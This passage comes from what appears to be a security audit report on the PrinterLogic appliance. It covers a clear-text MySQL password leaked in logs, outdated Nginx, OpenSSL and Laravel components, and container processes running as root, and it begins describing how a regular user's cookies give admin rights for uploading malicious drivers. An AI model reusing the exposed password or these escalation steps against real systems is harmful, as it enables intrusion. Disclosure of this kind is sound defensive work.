services.log-20220131.xz:Jan 31 05:12:03 printerlogic va/printercloud_idpi.1.z63z6m6udibpdq0mry74vv0xw[1547]: + timeout 180 bash -c '    until mysql     -h mysql     -u admin     -P 3306     --password="<font color=red>BBlIL1X1ARvyrnA3FBpt</font>"     -e '"'"'CREATE SCHEMA IF NOT EXISTS `app_idpi`'"'"';     do sleep 5; done
services.log-20220131.xz:Jan 31 05:25:12 printerlogic va/printercloud_scd.1.fp2n1q66h84za3kweq6m91k6s[1387]: + timeout 180 bash -c '    until mysql     -h mysql     -u admin     -P 3306     --password="<font color=red>BBlIL1X1ARvyrnA3FBpt</font>"     -e '"'"'CREATE SCHEMA IF NOT EXISTS `app_scd`'"'"';     do sleep 5; done
services.log-20220131.xz:Jan 31 05:25:13 printerlogic va/printercloud_pq.1.1xuk7airnt3u8tbpbkzed8pbh[1387]: + timeout 180 bash -c     until mysql     -h mysql     -u admin     -P 3306     --password="<font color=red>BBlIL1X1ARvyrnA3FBpt</font>"     -e 'CREATE SCHEMA IF NOT EXISTS `app_pi`';     do sleep 5; done
</pre>

<p>The files <code>pi.log</code> and <code>services.log</code> contain passwords in clear-text.</p>
<p>Because of the lack of defense in depth and the fact that passwords are written in clear-text in world-readable files, if any docker instance is compromised then the appliance is likely compromised.</p>
<p><a id="va-outdated-components"></a></p>
<h2>Details - Outdated, End-Of-Life, unsupported and vulnerable components (Nginx, libraries, Laravel, operating systems)</h2>
<p>While checking the 109 Nginx processes running in the appliance, it appears Nginx is running inside several different Docker instances and some versions are outdated and have CVEs.</p>
<p>Determining Nginx versions:</p>
<pre><code>root@printerlogic:/dev/shm# ps -auxww | grep -i nginx | wc -l
109
root@printerlogic:/dev/shm# for i in $(docker ps | awk '{ print $1 }'); do (echo $(docker ps | grep $i);docker exec -it $i /usr/sbin/nginx -V;echo ) &gt;/dev/shm/$i;done
root@printerlogic:/dev/shm# awk '/version/{ print $3 }' * | sort | uniq -c
      2 nginx/1.17.2
     13 nginx/1.17.5
      1 nginx/1.20.0
      2 nginx/1.21.4
      1 nginx/1.21.5
</code></pre>
<p>In total, the Docker instances use 5 different versions of Nginx:</p>
<ul>
<li>1.17.2 (2 instances)</li>
<li>1.17.5 (13 instances)</li>
<li>1.20.0 (1 instance)</li>
<li>1.21.4 (2 instances)</li>
<li>1.21.5 (1 instance)</li>
</ul>
<p>Nginx 1.17 branch is EOL and security fixes haven't been applied in the Nginx installations because some binaries haven't been updated since 2019.</p>
<p>Date of when the nginx binaries have been installed into Docker instances:</p>
<pre>
root@printerlogic:/dev/shm# for i in $(docker ps|awk '{ print $1 }'); do docker exec -it $i ls -la /usr/sbin/nginx;done
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font> /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1149824 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1322056 <font color=red>Jul 23  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1378488 Nov  2 15:01 /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1374232 Apr 20  2021 /usr/sbin/nginx
-rwxr-xr-x 1 root root 1378488 Nov  2 15:01 /usr/sbin/nginx
-rwxr-xr-x 1 root root 1149824 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1198240 Dec 28 18:48 /usr/sbin/nginx
-rwxr-xr-x 1 root root 1145728 <font color=red>Jul 23  2019</font>  /usr/sbin/nginx
-rwxr-xr-x 1 root root 1326152 <font color=red>Oct 22  2019</font>  /usr/sbin/nginx
</pre>

<p>When analyzing these builts, some Nginx have been compiled by unsupported OS which is not clearly a good indicator regarding security.</p>
<p>Determining operating systems that were used when compiling the Nginx binaries:</p>
<pre><code>root@printerlogic:/dev/shm# cat * | grep -i gcc | sort | uniq -c
      2 built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
      1 built by gcc 10.3.1 20211027 (Alpine 10.3.1_git20211027) 
      1 built by gcc 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) 
      3 built by gcc 8.3.0 (Alpine 8.3.0) 
     11 built by gcc 8.3.0 (Debian 8.3.0-6) 
      1 built by gcc 9.3.0 (Ubuntu 9.3.0-10ubuntu2)
</code></pre>
<p>A script is provided to check the version of the userland (<code>operating systems</code>) used in Docker instances:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>root@printerlogic:/dev/shm# cat check-docker-os.sh
      <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#!/bin/sh</span>
      <span style="color: #666666">2</span> 
      <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">for</span> i in <span style="color: #008000; font-weight: bold">$(</span>docker ps | awk <span style="color: #BA2121">&#39;{ print $1 }&#39;</span><span style="color: #008000; font-weight: bold">)</span>
      <span style="color: #666666">4</span> <span style="color: #008000; font-weight: bold">do</span>
      <span style="color: #666666">5</span>   <span style="color: #008000">echo</span> <span style="color: #008000; font-weight: bold">$(</span>docker ps | grep <span style="color: #19177C">$i</span><span style="color: #008000; font-weight: bold">)</span>
      <span style="color: #666666">6</span>   docker <span style="color: #008000">exec</span> -it <span style="color: #19177C">$i</span> sh -c <span style="color: #BA2121">&#39;if [ -f /usr/lib/os-release ]; then</span>
<span style="color: #BA2121">      7        cat /usr/lib/os-release</span>
<span style="color: #BA2121">      8      fi</span>
<span style="color: #BA2121">      9      if [ -f /etc/alpine-release ]; then</span>
<span style="color: #BA2121">     10        cat /etc/alpine-release</span>
<span style="color: #BA2121">     11      fi&#39;</span>
     <span style="color: #666666">12</span>   <span style="color: #008000">echo</span>
     <span style="color: #666666">13</span> <span style="color: #008000; font-weight: bold">done</span>
</pre></div>

<p>Using this script, the underlying operating systems for each Docker instance were determined.</p>
<p>Unsupported systems are still in use even if libraries are outdated and security patches are not provided anymore:</p>
<ul>
<li><font color=red> Alpine 3.10.5 - printerlogic/idpi:1.0.6</li>
<li>Alpine 3.10.5 - printerlogic/scd:1.0.70</li>
<li>Alpine 3.10.5 - printerlogic/tree:1.0.57</li>
<li>Alpine 3.11.11 - printerlogic/scss:1.0.39</li>
<li>Alpine 3.11.12 - printerlogic/prs:1.0.2</li>
<li>Alpine 3.11.2 - printerlogic/eb:0.0.4</li>
<li>Alpine 3.11.9 - printerlogic/ebc:1.0.34</font></li>
<li>Alpine 3.12.0 - dperson/samba:latest</li>
<li>Alpine 3.13.5 - printerlogic/hive:1.1.30</li>
<li>Alpine 3.14.2 - printerlogic/va-api:1.1.4</li>
<li>Alpine 3.14.3 - printerlogic/edw:1.0.44, traefik:latest, printerlogic/cat:1.0.58,</li>
<li>Alpine 3.15.0 - printerlogic/oncp-pgw:v1.0.21, printerlogic/oncp-hold:v1.0.31, printerlogic/identity:v1.0.88, printerlogic/ofn:1.108.0, redis:5-alpine, printerlogic/oncp-ofn:v1.0.6, printerlogic/oncp-reg:1.0.15, printerlogic/qms:1.0.124, printerlogic/va-cdn:0.0.435,</li>
<li>Debian 10 - printerlogic/pq:5.0.124, printerlogic/authn:1.0.257, printerlogic/pi:5.0.6539, printerlogic/pi:5.0.6539, printerlogic/scim:1.0.9, printerlogic/sched:1.0.18, printerlogic/pi:5.0.6539, mysql:8.0.26, printerlogic/pi:5.0.6539, printerlogic/pi:5.0.6539, printerlogic/gw:1.208.5, printerlogic/pi:5.0.6539, printerlogic/cpp-ui:1.80.5,</li>
<li>Debian 11 - printerlogic/users:5.186.1, printerlogic/users:5.186.1,</li>
<li>Ubuntu 18.04.6 LTS - printerlogic/client:25.1.0.551</li>
<li>Ubuntu 20.04.2 LTS - printerlogic/br:1.0.62</li>
</ul>
<p>Alpine 3.10.x and 3.11.x are EOL.</p>
<p>Alpine 3.12.x will be EOL in May 2022, Alpine 3.13 will be EOL in November 2022 and Debian 10 will be EOL in August 2022.</p>
<p>Furthermore, some Docker instances are using Debian 10 which will be EOL-ed in 6 months.</p>
<p>It is also possible to check the versions of OpenSSL libraries used by Nginx: OpenSSL 1.1.d is outdated and is affected by several CVEs. OpenSSL 1.1.1k is also outdated (but may contain back-port security patches):</p>
<pre>
root@printerlogic:~# for i in $(docker ps | awk '{ print $1 }'); do docker exec -it $i /usr/sbin/nginx -V;done | grep -i openssl
Error: No such container: CONTAINER
<font color=red>built with OpenSSL 1.1.0j  20 Nov 2018 (running with OpenSSL 1.1.1d  10 Sep 2019)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)</font>
built with OpenSSL 1.1.1k  25 Mar 2021
built with OpenSSL 1.1.1l  24 Aug 2021
built with OpenSSL 1.1.1k  25 Mar 2021
<font color=red>built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)</font>
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1k  25 Mar 2021)
<font color=red>built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)</font>
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1k  25 Mar 2021)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1k  25 Mar 2021)
built with OpenSSL 1.1.1f  31 Mar 2020
<font color=red>built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)
built with OpenSSL 1.1.1c  28 May 2019 (running with OpenSSL 1.1.1d  10 Sep 2019)</font>
root@printerlogic:~#
</pre>

<p>When randomly choosing a Docker instance, we can confirm the openssl version is outdated. This version will still be used by the PHP code running on the Docker instance.</p>
<p>Determining the openssl versions in the <code>printerlogic/pi:5.0.6539</code> Docker instance :</p>
<pre>
root@printerlogic:~# docker ps | grep 5f1ea5e4df83
5f1ea5e4df83        printerlogic/pi:5.0.6539         "/var/www/app/.docke"   11 minutes ago      Up 11 minutes             80/tcp, 443/tcp, 9000-9001/tcp   printercloud_worker-pi-snmp.1.ov4ffd4qd6r734pcslu6r9kr6
root@printerlogic:~# docker exec -it 5f1ea5e4df83 /bin/sh
# ps -a   
  PID TTY          TIME CMD
   98 pts/0    00:00:00 ps
# ps -auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  0.6 392100 49132 ?        Ssl  02:08   0:00 php artisan queue:work --queue=snmp-status --sleep=3 --tries=1
root        93  1.5  0.0   2392   764 pts/0    Ss   02:20   0:00 /bin/sh
root        99  0.0  0.0 217556  3064 pts/0    R+   02:20   0:00 ps -auxww
# find /|grep libssl
/usr/lib/x86_64-linux-gnu/libssl.so.1.1
/usr/lib/x86_64-linux-gnu/libssl.so
/usr/lib/x86_64-linux-gnu/libssl.a
[...]
# strings /usr/lib/x86_64-linux-gnu/libssl.so | grep OpenSSL
<font color=red>OpenSSL 1.1.1d  10 Sep 2019</font>
#
</pre>

<p>When analyzing the Docker instances freely available at <a href="https://hub.docker.com/r/printerlogic/base-php-fpm-nginx">https://hub.docker.com/r/printerlogic/base-php-fpm-nginx</a>, it was confirmed these instances are using outdated software. These instances are likely used as reference images to create new instances.</p>
<p>Determining software versions in the <code>printerlogic/base-php-fpm-nginx:latest</code> reference image:</p>
<pre>
kali# docker pull printerlogic/base-php-fpm-nginx
Using default tag: latest
latest: Pulling from printerlogic/base-php-fpm-nginx
6ec7b7d162b2: Pull complete 
db606474d60c: Pull complete 
afb30f0cd8e0: Pull complete 
3bb2e8051594: Pull complete 
4d71313b39b0: Pull complete 
381de550657f: Pull complete 
e671c4250cc8: Pull complete
[...]
kali# docker save printerlogic/base-php-fpm-nginx > /dev/shm/test.tar
kali# pwd
/dev/shm 
kali# mkdir output && cd output                                                                        
kali# tar xvf ../test.tar
kali# for i in */; do cd $i && tar xvf *tar && cd /dev/shm/output;done
kali# strings ./679eaa2d89e00f8903c220a8d880e07c4205ef789d665adff4b59e77fe1abb93/usr/lib/x86_64-linux-gnu/libssl.so.1.1|grep OpenSSL 
<font color=red>OpenSSL 1.1.1d  10 Sep 2019</font>
kali# strings *//usr/sbin/nginx|grep 1.17
nginx version: nginx/1.17.5
configure arguments: --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules [...] -fdebug-prefix-map=/data/builder/debuild/nginx-1.17.5/debian/debuild-base/<font color=red>nginx-1.17.5</font>=. -fstack-protector-strong -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC' --with-ld-opt='-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie'
<font color=red>nginx/1.17.5</font>
</pre>

<p>Futhermore, while auditing the PHP code, it appears the appliance is using a mix of different versions of Laravel in the Docker instances - all of these versions are EOL.</p>
<p>Determining the Laravel version in all Docker instances:</p>
<pre>
root@printerlogic:~# for i in $(docker ps | awk '{ print $1 }'); do echo $(docker ps | grep $i | awk '{ print $2'}); docker exec -it $i sh -c "if [ -f /var/www/vendor/laravel/framework/src/Illuminate/Foundation/Application.php ]; then grep -B 5 'VERSION =' /var/www/vendor/laravel/framework/src/Illuminate/Foundation/Application.php;fi";echo; done

printerlogic/pi:5.0.6539
    /**
     * The Laravel framework version.
     *
     * @var string
     */
    <font color=red>const VERSION = '5.5.45'; <- EOL in 2020</font>

printerlogic/pi:5.0.6539
    <font color=red>const VERSION = '5.5.45'; <- EOL IN 2020</font>

printerlogic/users:5.186.1
    <font color=red>const VERSION = '5.8.38'; <- EOL IN 2019</font>

printerlogic/pi:5.0.6539
    <font color=red>const VERSION = '5.5.45'; <- EOL IN 2020</font>

printerlogic/scd:1.0.70
    <font color=red>const VERSION = '6.18.10'; <- EOL but security patches still provided</font>

printerlogic/scim:1.0.9
    <font color=red>const VERSION = '5.8.38'; <- EOL IN 2019</font>

printerlogic/gw:1.208.5
    <font color=red>const VERSION = '5.7.26'; <- EOL IN 2019</font>

printerlogic/users:5.186.1
    <font color=red>const VERSION = '5.8.38'; <- EOL IN 2020</font>

printerlogic/cpp-ui:1.80.5
    <font color=red>const VERSION = '7.12.0'; <- will EOL in March 2022</font>

printerlogic/idpi:1.0.6
    <font color=red>const VERSION = '6.14.0'; <- EOL but security patches still provided</font>

printerlogic/authn:1.0.257
    <font color=red>const VERSION = '5.8.38'; <- EOL IN 2019</font>

printerlogic/pi:5.0.6539
    <font color=red>const VERSION = '5.5.45'; <- EOL IN 2020</font>

printerlogic/tree:1.0.57
    <font color=red>const VERSION = '6.20.43'; <- EOL but security patches still provided</font>

printerlogic/pi:5.0.6539
    <font color=red>const VERSION = '5.5.45'; <- EOL IN 2020</font>

printerlogic/pq:5.0.124
    <font color=red>const VERSION = '5.7.9'; <- EOL IN 2019</font>

printerlogic/pi:5.0.6539
    <font color=red>const VERSION = '5.5.45'; <- EOL IN 2020</font>
</pre>

<p>Laravel versions are EOL in these 16 Docker instances.</p>
<p>Laravel support (image from Wikipedia, as of January 2022): </p>
<p><img alt="" src="images/2025-vasion-report-1-laravel.png" /></p>
<p><a href="images/2025-vasion-report-1-laravel-full.png">Click here for full image</a></p>
<p>The code is also using outdated PHP libraries, containing public vulnerabilities:</p>
<ul>
<li>./app/lib/common/aws/sdk.class.php from 2011</li>
<li>./app/lib/common/phpmailer/class.phpmailer.php 5.1 from 2010 ( * @version $Id: class.phpmailer.php,v 1.1 2010/09/05 01:08:18 aaron Exp $)</li>
<li>./app/common/upload.class.php class upload - 0.27 (14/05/2009) - several CVEs</li>
</ul>
<p>Some of these libraries are outdated and are vulnerable to public vulnerabilities. It is recommended to review all the libraries in the different directories they are stored:</p>
<pre><code>kali% less app/common/
d3.tip.js                       jquery-migrate-1.2.1.js         ppp_only/                       validation.class.php
google_authorization_email.txt  jquery-ui-1.8.1.custom.min.js   themes/                         version_reader.php
jquery.dataTables.js            login.class.php                 tooltips.js     
jquery-fieldselection.js        passwordrecovery.email.txt      upload.class.php
kali% ls app/lib/common 
admin.header.inc.php       breadcrumbs.php      current_selection.php  header.inc.php     logout.php  php-imap     TranslationsEmbedStaticTranslations.php
auto_open_tree_search.php  browse_complete.php  global.inc.php         lightopenid        oses.php    phpmailer    verify_company_login.php
aws                        browse.php           global.php             load-settings.php  pChart      tooltip.php
</code></pre>
<p>All the docker instances are using outdated libraries, without security patches.</p>
<p>The code relies heavily on Laravel / Illuminate and these libraries are outdated and contain security vulnerabilities.</p>
<p><a id="va-processes-running-as-root"></a></p>
<h2>Details - Processes running as root in Docker instances</h2>
<p>When analyzing Docker instances, it was observed that some Docker instances are running processes (php, nodeJS, Rust binaries, Go binaries) as root. This list is not exhaustive.</p>
<p>Custom processes running as root inside Docker instances:</p>
<pre><code>root@printerlogic:/dev/shm/a# for i in $(docker ps | awk '{ print $1 }'); do echo $(docker ps | grep $i); docker exec -it $i sh -c 'ps -a';done

16178d2bccb2 printerlogic/va-api:1.1.4 "/opt/entrypoint.sh " 3 hours ago Up 3 hours (healthy) 80/tcp printercloud-appliance_va-api.1.fwacyv7l7gqxqrtwox45kvp1i
PID   USER     TIME  COMMAND
    1 root      0:01 va-api

9f72609937de printerlogic/pi:5.0.6539 "/var/www/app/.docke" 3 hours ago Up 3 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-seeder.1.tbniqiidu8vtqpjtxjwh8oxsm
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 392100 21920 ?        Ssl  03:38   0:07 php artisan queue:work --queue=seeder --sleep=3 --tries=1

7d39399f459a printerlogic/pi:5.0.6539 "/var/www/app/.docke" 3 hours ago Up 3 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-reports.1.es8sfg9p6zya8r8396izh5z1i
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 392100 22484 ?        Ssl  03:38   0:07 php artisan queue:work --queue=scheduled-report --sleep=3 --tries=1

bb96b17d45b8 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 3 hours ago Up 3 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-snmp.1.ttxndt3y7brnkw95vxluhht7l
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 392100 23808 ?        Ssl  03:38   0:07 php artisan queue:work --queue=snmp-status --sleep=3 --tries=1

9ad5da8b9d25 printerlogic/sched:1.0.18 "/var/www/app/.dock" 3 hours ago Up 3 hours 80/tcp, 443/tcp, 9000/tcp printercloud-appliance_worker-scheduler.1.sy93cqxhn8fjypvfg9eu78may
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2392   976 ?        Ss   03:37   0:00 sh -c while true; do php /var/www/app/artisan schedule:run; sleep 6

b3b7793a3e95 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 3 hours ago Up 3 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-low.1.whls4vm5xshz3h44c462iwdc1
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3 392100 28060 ?        Ssl  03:38   0:07 php artisan queue:work --queue=laravel-schedule-low --sleep=3 -tri

ac69cca5df62 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 3 hours ago Up 3 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-high.1.3cr0gdxirucwzdk2j5d0rbtja
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3 398244 30584 ?        Ssl  03:38   0:09 php artisan queue:work --queue=laravel-schedule-high --sleep=3 -tr

bf43c1f6503e printerlogic/users:5.186.1 "/var/www/app/.docke" 3 hours ago Up 3 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-users-queue.1.n3hbhjezaps6gwkw1nuqupdq4
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  0.2 389304 19952 ?        Ssl  03:38   0:10 php artisan queue:work --queue=users --sleep=3 --tries=1

6b3781947b83 printerlogic/client:25.1.0.551 "/bin/sh -c 'supervi" 3 hours ago Up 3 hours printercloud-appliance_client.1.pnbxglabahqd9prozbvbs55sc
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   4636   464 ?        Ss   03:38   0:00 /bin/sh -c supervisord -n -c /etc/supervisor/supervisord.conf
root         6  0.0  0.0  55460  3640 ?        S    03:38   0:03 /usr/bin/python /usr/bin/supervisord -n -c /etc/supervisor/supervis
root         9  0.4  0.4 958256 40652 ?        Sl   03:38   0:43 /opt/PrinterInstallerClient/service_interface/./PrinterInstallerCli

7a508d3d8623 printerlogic/oncp-hold:v1.0.31 "./cloud-print-job-h" 3 hours ago Up 3 hours (healthy) 80/tcp printercloud_oncp-hold.1.u3ac7ousxjn4ff5kkcvwgf9n4
PID   USER     TIME  COMMAND
    1 root      0:21 ./cloud-print-job-holder-app

7a508d3d8623 printerlogic/oncp-hold:v1.0.31 "./cloud-print-job-h" 3 hours ago Up 3 hours (healthy) 80/tcp printercloud_oncp-hold.1.u3ac7ousxjn4ff5kkcvwgf9n4
PID   USER     TIME  COMMAND
    1 root      0:21 ./cloud-print-job-holder-app

d4a0594b6121 printerlogic/ebc:1.0.34 "/var/www/app/.docke" 3 hours ago Up 3 hours (healthy) 80/tcp, 9229/tcp printercloud_ebc.1.1e4rjf6mzq9t53swqdgxgfnwu
PID   USER     TIME  COMMAND
    1 root      0:01 {node} npm run start
   27 root      0:04 node ./src/server.js

ed12cf7e4428 printerlogic/oncp-reg:1.0.15 "/opt/entrypoint.sh " 3 hours ago Up 3 hours (healthy) printercloud_oncp-reg.1.y5dmk4y84g6rjyrt4t53syutz
PID   USER     TIME  COMMAND
    1 root      0:06 api

6092ba3e4189 printerlogic/oncp-pgw:v1.0.21 "./cloud-print-print" 3 hours ago Up 3 hours (healthy) 80-81/tcp printercloud_oncp-pgw.1.x9j0c6o7ydf0ehb2pmwxb70fj
PID   USER     TIME  COMMAND
    1 root      0:48 ./cloud-print-printer-gw

f784e1b43237 printerlogic/qms:1.0.124 "/opt/entrypoint.sh " 3 hours ago Up 3 hours (healthy) printercloud_qms.1.ek9zr8g67vb9k0s1n9nv2s736
PID   USER     TIME  COMMAND
    1 root      0:06 api

9098f6052c94 printerlogic/identity:v1.0.88 "/usr/local/bin/iden" 3 hours ago Up 3 hours (healthy) 80/tcp printercloud_identity.1.8x0lwby90079bojeabu8vhead
PID   USER     TIME  COMMAND
    1 root      0:01 /usr/local/bin/identity_api

0bf820403a1a printerlogic/edw:1.0.44 "/opt/entrypoint.sh " 3 hours ago Up 3 hours (healthy) printercloud_edw.1.yt5pd4mmletn81vs3wo5dz77q
PID   USER     TIME  COMMAND
    1 root      0:00 /opt/api

bc477aaff3d7 printerlogic/oncp-ofn:v1.0.6 "off-network-app" 3 hours ago Up 3 hours (healthy) 80/tcp printercloud_oncp-ofn.1.szvk26xlr897j96p2z29hlv9p
PID   USER     TIME  COMMAND
    1 root      0:01 off-network-app

e9994d5a21bf printerlogic/prs:1.0.2 "/var/www/app/.docke" 3 hours ago Up 3 hours (healthy) 80/tcp, 9229/tcp printercloud_prs.1.6uuzdvqkb39u910gw9e3yupfy
PID   USER     TIME  COMMAND
    1 root      0:00 npm
   25 root      0:35 node ./src/server.js

5b99b9c2a4b2 printerlogic/eb:0.0.4 "/var/www/app/.docke" 3 hours ago Up 3 hours (healthy) 3000/tcp, 9229/tcp printercloud_eb.1.wtzjn9sdbl6wva6dy3u1y1nh5
PID   USER     TIME  COMMAND
    1 root      0:00 npm
   23 root      0:00 npm
   38 root      0:00 [node]
   88 root      0:05 node runParallel.js runRestApiServer.js runPollingProxy.js
   94 root      1:08 /usr/local/bin/node /var/www/app/runRestApiServer.js
   99 root      0:32 /usr/local/bin/node /var/www/app/runPollingProxy.js

a7bff45e538c printerlogic/ofn:1.108.0 "off-network-app" 3 hours ago Up 3 hours (healthy) 80/tcp printercloud_ofn.1.18qn5bj4eqgpbq2d94k6hy8vx
PID   USER     TIME  COMMAND
    1 root      0:01 off-network-app

317daac676fd printerlogic/scss:1.0.39 "/var/www/app/.docke" 3 hours ago Up 3 hours (healthy) 80/tcp, 9229/tcp printercloud_scss.1.uc6fcunwy1s3hdb6di4avqlzb
PID   USER     TIME  COMMAND
    1 root      0:00 npm run start
   63 root      0:22 node bin/src/server.js

a842502dcc97 printerlogic/cat:1.0.58 "/var/www/app/.docke" 3 hours ago Up 3 hours (healthy) 80/tcp, 9229/tcp printercloud_cat.a6zgwxfp4n2v4tdi8u7b40shy.fgp2p5wo56hg4sanjmirpoyzl
PID   USER     TIME  COMMAND
    1 root      0:00 npm
   19 root      0:00 [node]
   69 root      0:00 [node]
  108 root      0:07 node runRestApiServer.js
 5318 root      0:00 ps -a

022c2a2201b4 printerlogic/hive:1.1.30 "/opt/entrypoint.sh " 6 days ago Up 3 hours cicd_hive_1
PID   USER     TIME  COMMAND
    1 root      0:02 hive monitor
</code></pre>
<p>Running everything as root is dangerous - vulnerability inside a service may be used by the attacker to move laterally and compromise the host.</p>
<p><a id="va-lpe"></a></p>
<h2>Details - Creation of administrator cookies using the credentials of regular users</h2>
<p>Using a local user account, it is possible to elevate the privileges to admin privileges.</p>
<p>Using these admin privileges, it is possible to do a lot of administrative tasks on the solution.</p>
<p>As an example, I will show how to use this weakness to upload malicious driver packages to the remote server.</p>
<p>Creation of a user <code>user</code> without admin privileges:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-01.png" /></p>
<p><a href="images/2025-vasion-report-1-admin-cookie-01-full.png">Click here for full image</a></p>
<p>Local user without administrator privileges</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-02.png" /></p>
<p><a href="images/2025-vasion-report-1-admin-cookie-02-full.png">Click here for full image</a></p>
<p>Local user without administrator privileges</p>
<p>Using this account, it is possible to login into <code>/admin/</code>. Even if the workspace is empty, the session cookies have administrator privileges:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-03.png" /></p>
<p><a href="images/2025-vasion-report-1-admin-cookie-03-full.png">Click here for full image</a></p>
<p>Logged as user inside <code>/admin/</code></p>
<p>On the SaaS installation, this vulnerability is also present. A user <code>test-user</code> has been created and he is able to login to https://[redacted].prrintercloud10.com/admin/index.php:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-04.png" />
Logged as user <code>test-user</code> inside <code>/admin/</code> in the SaaS version</p>
<p>The session cookies of the normal user obtained by login into <code>/admin/</code> can be then used to upload new drivers into the system.</p>
<p>Using Burp, I extracted the session cookies for the <code>user</code> logged in <code>/admin/</code>:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-05.png" /></p>
<p><a href="images/2025-vasion-report-1-admin-cookie-05-full.png">Click here for full image</a></p>
<p>Session cookies of a normal user</p>
<p>Crafting a custom upload request to be used by the PrinterLogic client under Linux/MacOS.</p>
<p>File to be placed inside <code>/opt/PrinterInstallerClient/tmp/requests/1-1</code>:</p>
<pre><code>1 UPLOAD_DRIVER
2 base64(protocol)
3 base64(domain_name||ip)
4 base64("/")
5 base64(PHPSESSID=VALUE;XSRF-TOKEN=VALUE;laravel_session=VALUE;)
6 
7 base64("1")
</code></pre>
<p>I created a custom valid request file by transforming the previous cookies into acceptable data by the PrinterLogic client running on the test laptop (no LF characters, no space, trailing ";" at the end of the line, no url-encoded characters):    </p>
<p>Valid Cookies to be used by the PrinterLogic Client:</p>
<pre><code>kali% cat cookies.txt                                                   
